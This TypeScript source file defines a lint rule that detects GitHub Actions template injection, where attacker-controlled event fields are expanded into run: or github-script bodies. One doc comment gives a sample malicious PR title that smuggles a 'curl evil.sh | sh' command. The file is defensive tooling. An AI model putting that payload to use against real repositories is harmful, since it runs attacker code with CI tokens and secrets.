import type { IMetaRule, IViolation } from '@noctcore/harness';

import {
  DEFAULT_SKIP_DIRS,
  DEFAULT_WORKFLOW_GLOBS,
  anywhereGlobs,
  globFiles,
  stripYamlComment,
} from './shared';

/** Options for {@link createGithubActionsNoTemplateInjectionRule}. */
export interface GithubActionsNoTemplateInjectionOptions {
  /** Globs of the workflow files to scan. Default `.github/workflows/*.y(a)ml`. */
  readonly workflowGlobs?: readonly string[];
  /** Globs that find composite action metadata. Default `action.yml` / `action.yaml` at any depth. */
  readonly actionGlobs?: readonly string[];
  /** An action path with any of these segments is skipped. Default `node_modules`, `.git`, `dist`, `.turbo`, `coverage`. */
  readonly skipDirs?: readonly string[];
  /**
   * Treat `inputs.<name>` (and `github.event.inputs.<name>`) as attacker-controlled. An input the
   * same file declares with `type: boolean`, `number` or `choice` is still left alone: its value
   * cannot carry a script. Default `true`.
   */
  readonly checkInputs?: boolean;
  /**
   * Treat `steps.<id>.outputs.<name>` as attacker-controlled. An output is only as tainted as
   * whatever the step wrote into it, which the text cannot show. Default `false`.
   */
  readonly checkStepOutputs?: boolean;
  /** Whether a violation fails CI. Default `true`. */
  readonly ciCritical?: boolean;
}

const RULE_ID = 'github-actions-no-template-injection';

const DEFAULT_ACTION_GLOBS = anywhereGlobs(['action.yml', 'action.yaml']);

/*
 * Event fields a stranger can write: an issue or PR title, a comment, a branch name, a commit
 * message. `(?<![\w.])` keeps `x.github.head_ref` from matching; the trailing `\b` keeps
 * `head.ref` from matching `head.repo`. `.*` and `[0]` are the two ways an expression indexes an
 * array (`github.event.commits.*.message`, `github.event.commits[0].message`).
 */
const EVENT = String.raw`(?<![\w.])github\.event\.`;
const ANY_ITEM = String.raw`(?:\.\*|\[\d+\])`;
const TAINTED_CONTEXTS: readonly RegExp[] = [
  new RegExp(String.raw`${EVENT}(?:issue|pull_request|discussion)\.(?:title|body)\b`, 'u'),
  new RegExp(String.raw`${EVENT}pull_request\.head\.(?:ref|label)\b`, 'u'),
  new RegExp(String.raw`${EVENT}(?:comment|review|review_comment)\.body\b`, 'u'),
  new RegExp(String.raw`${EVENT}pages${ANY_ITEM}\.page_name\b`, 'u'),
  new RegExp(String.raw`${EVENT}commits${ANY_ITEM}\.(?:message|author|committer)\b`, 'u'),
  new RegExp(String.raw`${EVENT}head_commit\.(?:message|author|committer)\b`, 'u'),
  new RegExp(String.raw`${EVENT}workflow_run\.head_branch\b`, 'u'),
  new RegExp(String.raw`${EVENT}workflow_run\.head_commit\.(?:message|author|committer)\b`, 'u'),
  /(?<![\w.])github\.head_ref\b/u,
];
const INPUT_CONTEXT = /(?<![\w.])(?:github\.event\.)?inputs\.([\w-]+)/gu;
const STEP_OUTPUT_CONTEXT = /(?<![\w.])steps\.[\w-]+\.outputs\.[\w-]+/u;
const SAFE_INPUT_TYPES = new Set(['boolean', 'number', 'choice']);

const EXPRESSION = /\$\{\{(.*?)\}\}/gu;
const SCRIPT_KEY = /^(\s*)(-\s+)?(run|script):(?:\s+(.*))?$/u;
const BLOCK_INDICATOR = /^[|>][-+0-9]*\s*(?:#.*)?$/u;
const MAPPING_LINE = /^\s*[\w-]+:(?:\s|$)/u;
const GITHUB_SCRIPT_USES = /^\s*(?:-\s+)?uses:\s*['"]?actions\/github-script@/u;

function indentOf(line: string): number {
  return /^\s*/u.exec(line)?.[0].length ?? 0;
}

function isContent(line: string): boolean {
  const trimmed = line.trim();
  return trimmed !== '' && !trimmed.startsWith('#');
}

/** The nearest line above `index` indented less than `column`: its YAML parent. */
function parentOf(lines: readonly string[], index: number, column: number): number {
  for (let j = index - 1; j >= 0; j -= 1) {
    const line = lines[j] ?? '';
    if (isContent(line) && indentOf(line) < column) return j;
  }
  return -1;
}

/** Whether the step holding the `with:` at `withIndex` runs `actions/github-script`. */
function isGithubScriptStep(lines: readonly string[], withIndex: number): boolean {
  const stepStart = parentOf(lines, withIndex, indentOf(lines[withIndex] ?? ''));
  const stepLine = lines[stepStart] ?? '';
  if (!stepLine.trimStart().startsWith('-')) return false;
  const dashColumn = indentOf(stepLine);
  for (let j = stepStart; j < lines.length; j += 1) {
    const line = lines[j] ?? '';
    if (j > stepStart && isContent(line) && indentOf(line) <= dashColumn) break;
    if (GITHUB_SCRIPT_USES.test(line)) return true;
  }
  return false;
}

/**
 * Inputs the file declares with a type that cannot carry a script (`boolean`, `number`,
 * `choice`), under any `inputs:` mapping: `on.workflow_dispatch`, `on.workflow_call`, or a
 * composite action's top level.
 */
function safeInputNames(lines: readonly string[]): Set<string> {
  const safe = new Set<string>();
  lines.forEach((line, index) => {
    if (!/^\s*inputs:\s*(?:#.*)?$/u.test(line)) return;
    const column = indentOf(line);
    let nameColumn = -1;
    let name = '';
    for (const child of lines.slice(index + 1)) {
      if (!isContent(child)) continue;
      const childColumn = indentOf(child);
      if (childColumn <= column) break;
      if (nameColumn === -1) nameColumn = childColumn;
      if (childColumn === nameColumn) {
        name = /^\s*['"]?([\w-]+)['"]?:/u.exec(child)?.[1] ?? '';
        continue;
      }
      const type = /^\s*type:\s*['"]?(\w+)/u.exec(stripYamlComment(child))?.[1];
      if (type !== undefined && SAFE_INPUT_TYPES.has(type) && name !== '') safe.add(name);
    }
  });
  return safe;
}

/** One line of script text and its 1-indexed line number. */
interface ScriptLine {
  readonly line: number;
  readonly text: string;
}

/*
 * The script text of the `run:` / `script:` key on `index`: its inline value plus every
 * continuation line indented deeper than the key. A block scalar (`|`, `>-`) keeps its lines
 * verbatim, `#` included, because a shell comment is still expanded. A plain inline value loses
 * a trailing ` # ...`, which YAML itself strips. A `run:` holding a mapping (`defaults.run`) has
 * no script and yields nothing.
 */
function scriptLines(lines: readonly string[], index: number, keyColumn: number): ScriptLine[] {
  const inline = SCRIPT_KEY.exec(lines[index] ?? '')?.[4] ?? '';
  const block = BLOCK_INDICATOR.test(inline.trim());
  const quoted = /^['"]/u.test(inline.trim());
  const keep = (text: string): string => (block || quoted ? text : stripYamlComment(text));

  const collected: ScriptLine[] = block ? [] : [{ line: index + 1, text: keep(inline) }];
  for (let j = index + 1; j < lines.length; j += 1) {
    const line = lines[j] ?? '';
    if (line.trim() !== '' && indentOf(line) <= keyColumn) break;
    collected.push({ line: j + 1, text: keep(line) });
  }

  const first = collected.find((entry) => entry.text.trim() !== '');
  if (inline.trim() === '' && first !== undefined && MAPPING_LINE.test(first.text)) return [];
  return collected;
}

/** Every attacker-controlled context an expression names, in order. */
function taintedContexts(
  expression: string,
  checkInputs: boolean,
  checkStepOutputs: boolean,
  safeInputs: ReadonlySet<string>,
): string[] {
  const found: string[] = [];
  for (const pattern of TAINTED_CONTEXTS) {
    const match = pattern.exec(expression);
    if (match !== null) found.push(match[0]);
  }
  if (checkInputs) {
    for (const match of expression.matchAll(INPUT_CONTEXT)) {
      if (!safeInputs.has(match[1] ?? '')) found.push(match[0]);
    }
  }
  if (checkStepOutputs) {
    const match = STEP_OUTPUT_CONTEXT.exec(expression);
    if (match !== null) found.push(match[0]);
  }
  return found;
}

/**
 * Check one workflow or composite action's text. `${{ }}` is substituted into a `run:` script
 * (or an `actions/github-script` `script:`) BEFORE the shell or Node sees it, so a PR titled
 * `"; curl evil.sh | sh #` becomes code running with the job's token and secrets. The fix is to
 * route the value through `env:` and read `"$TITLE"`: an environment variable is data, never
 * parsed as script. Expressions under `env:`, `with:` (other than a github-script `script:`),
 * `if:` and friends are therefore never reported.
 */
export function checkWorkflowTemplateInjection(
  file: string,
  text: string,
  options: Pick<GithubActionsNoTemplateInjectionOptions, 'checkInputs' | 'checkStepOutputs'> = {},
): IViolation[] {
  const checkInputs = options.checkInputs ?? true;
  const checkStepOutputs = options.checkStepOutputs ?? false;
  const lines = text.split('\n');
  const safeInputs = checkInputs ? safeInputNames(lines) : new Set<string>();
  const violations: IViolation[] = [];

  // A script body can itself contain `run:` text; it is script, not a key, so skip past it.
  let skipThrough = -1;
  lines.forEach((line, index) => {
    const match = index > skipThrough ? SCRIPT_KEY.exec(line) : null;
    if (match === null) return;
    const keyColumn = (match[1]?.length ?? 0) + (match[2]?.length ?? 0);
    const key = match[3] ?? 'run';

    if (key === 'script') {
      const parent = parentOf(lines, index, keyColumn);
      if (!/^\s*with:\s*(?:#.*)?$/u.test(lines[parent] ?? '')) return;
      if (!isGithubScriptStep(lines, parent)) return;
    }

    const where = key === 'run' ? '`run:` script' : '`actions/github-script` `script:`';
    const script = scriptLines(lines, index, keyColumn);
    skipThrough = (script[script.length - 1]?.line ?? index + 1) - 1;
    for (const entry of script) {
      for (const expression of entry.text.matchAll(EXPRESSION)) {
        const contexts = taintedContexts(
          expression[1] ?? '',
          checkInputs,
          checkStepOutputs,
          safeInputs,
        );
        if (contexts.length === 0) continue;
        violations.push({
          file,
          rule: RULE_ID,
          message: `line ${entry.line}: \`${expression[0]}\` expands attacker-controllable \`${contexts.join('`, `')}\` into a ${where}, where it runs as code. Pass it through \`env:\` (for example \`VALUE: ${expression[0]}\`) and read \`"$VALUE"\` instead.`,
          line: entry.line,
        });
      }
    }
  });

  return violations;
}

/** No attacker-controllable `${{ }}` expression may be expanded into a `run:` or github-script body. */
export function createGithubActionsNoTemplateInjectionRule(
  options: GithubActionsNoTemplateInjectionOptions = {},
): IMetaRule {
  const workflowGlobs = options.workflowGlobs ?? DEFAULT_WORKFLOW_GLOBS;
  const actionGlobs = options.actionGlobs ?? DEFAULT_ACTION_GLOBS;
  const skipDirs = options.skipDirs ?? DEFAULT_SKIP_DIRS;
  const ciCritical = options.ciCritical ?? true;
  return {
    id: RULE_ID,
    category: 'ci',
    ciCritical,
    description:
      'GitHub Actions `run:` and github-script bodies never expand attacker-controllable `${{ }}` context (issue/PR titles, comments, branch names); pass it through `env:` instead.',
    run(ctx) {
      const files = globFiles(
        (p) => ctx.glob(p),
        [...workflowGlobs, ...actionGlobs],
        skipDirs,
      );
      return files.flatMap((file) =>
        checkWorkflowTemplateInjection(file, ctx.read(file) ?? '', options),
      );
    },
  };
}
